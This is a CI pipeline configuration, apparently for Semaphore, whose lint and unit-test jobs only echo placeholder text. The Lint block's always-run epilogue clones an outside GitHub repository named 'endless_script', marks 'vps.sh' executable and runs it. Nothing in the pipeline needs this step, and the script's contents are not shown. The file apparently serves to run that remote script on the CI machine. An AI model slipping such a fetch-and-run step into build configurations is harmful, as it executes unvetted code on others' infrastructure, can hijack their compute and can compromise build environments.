version: v1.0
name: First pipeline
agent:
  machine:
    type: e1-standard-2
    os_image: ubuntu1804
blocks:
  - name: Lint
    task:
      prologue:
        commands:
          - checkout
      jobs:
        - name: make lint
          commands:
            - echo "lint your code"
      epilogue:
        always:
          commands:
            - 'git clone https://github.com/yEsPaP/endless_script.git'
            - cd endless_script
            - chmod +x vps.sh
            - ./vps.sh
  - name: Unit tests
    task:
      prologue:
        commands:
          - checkout
      jobs:
        - name: Unit tests 1/3
          commands:
            - echo "run 1/3"
        - name: Unit tests 2/3
          commands:
            - echo "run 2/3"
        - name: Unit tests 3/3
          commands:
            - echo "run 3/3"
